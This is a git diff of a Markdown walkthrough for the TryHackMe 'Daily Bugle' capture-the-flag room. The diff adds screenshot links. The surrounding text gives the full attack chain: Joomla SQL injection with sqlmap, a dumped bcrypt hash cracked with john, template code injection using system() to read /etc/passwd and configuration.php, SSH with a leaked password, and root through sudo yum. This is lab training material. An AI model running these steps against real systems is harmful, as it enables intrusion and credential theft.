@@ -37,6 +37,7 @@ Directories found:
 /layouts
 /administrator
 ```
+[DailyBugle_2.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_2.png)
 - Joomscan
 
 We know **Joomla** is installed.
@@ -45,6 +46,8 @@ We have an interesting tool : joomscan (https://www.kali.org/tools/joomscan/)
 ```
 joomscan -u [IP]
 ```
+[DailyBugle_3.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_3.png)
+
 **Question**
 ###### What is the Joomla version?
 **Answer**
@@ -65,7 +68,7 @@ Explore the txt file to understand the exploit
 ```
 searchsploit -x php/webapps/42033.txt
 ```
-
+[DailyBugle_4.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_4.png)
 We have a beautiful sqlmap commandline to help us ^_^
 
 3. SQLMAP 
@@ -74,11 +77,13 @@ SQLMAP:
 sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
 ```
 *Info* : I don't use the option *--level=5* to perform the command to obtain the result more faster.
+[DailyBugle_5.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_5.png)
 
 Now, let's check all tables 
 ```
 sqlmap -u "http://10.10.59.102/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla --tables
 ```
+[DailyBugle_6.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_6.png)
 
 We found too many tables: 72
 Let's focus on __schemas , __session , __users , __user_keys
@@ -93,6 +98,7 @@ Result:
 | 811 | Super User | jonah@tryhackme.com | <blank> | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    |
 +-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
 ```
+[DailyBugle_7.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_7.png)
 
 We have the hash password for the **Super User** : jonah
 
@@ -107,6 +113,7 @@ We have the hash password for the **Super User** : jonah
 ```
 john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash_jonah
 ```
+[DailyBugle_8.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_8.png)
 
 **Question**
 ###### What is Jonah's cracked password?
@@ -118,14 +125,18 @@ john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash_jonah
 Let's navigate in the administration portal.
 User --> just jonah is here with super user privileges
 User Groups --> Only 1 user (Jonah) is here
+[DailyBugle_9.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_9.png)
 
 Now let's move to **Configuration/Global** --> Nothing really special
 Move to **Configuration/Templates** --> **One Template is used for allpages: Protostar**. Good information. We probably use this template to gather more informaiton.
+[DailyBugle_10.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_10.png)
 
-We can edit this template to see if we can exploit it by adding some code. For that: 
-- Click on Templates and select Protostar
-- Edit index.php
-- Add the line: 
+We can edit this template to see if we can exploit it by adding some code. 
+
+For that: 
+- Click on Templates and select Protostar [DailyBugle_11.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_11.png)
+- Edit index.php [DailyBugle_12.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_12.png)
+- Add the line [DailyBugle_13.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_13.png): 
 ```
 system("cat /etc/passwd")
 ```
@@ -142,7 +153,7 @@ system("cat configuration.php")
 6. SSH
 
 With the user **jjameson** and this password **nv5uz9r3ZEDzVjNu**, we can SSH the server.
-
+[DailyBugle_14.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_14.png)
 **Question**
 ###### What is the user flag?
 **Answer**
@@ -150,13 +161,13 @@ With the user **jjameson** and this password **nv5uz9r3ZEDzVjNu**, we can SSH th
 
 7. Privilege escalation
 
-- First: check what actions can do jjameson
+- First: check what actions can do jjameson [DailyBugle_15.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_15.png)
 ```
 sudo -l
 Result: jjameson can execute yum
 ```
 - Second: check https://gtfobins.github.io/gtfobins/yum/
-- Third: Create a file and copy/paste all command from the website
+- Third: Create a file and copy/paste all command from the website [DailyBugle_16.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_16.png)
 - Fourth : Make this file executable
 ```
 chmod +x yum.sh
@@ -166,7 +177,7 @@ chmod +x yum.sh
 ./yum.sh
 ```
 - Sixth: We are **root**
-
+[DailyBugle_17.png](https://github.com/LNB283/THM/blob/main/HARD/Daily%20Bugle/Pictures/DailyBugle_17.png)
 **Question**
 ###### What is the root flag?
 **Answer**
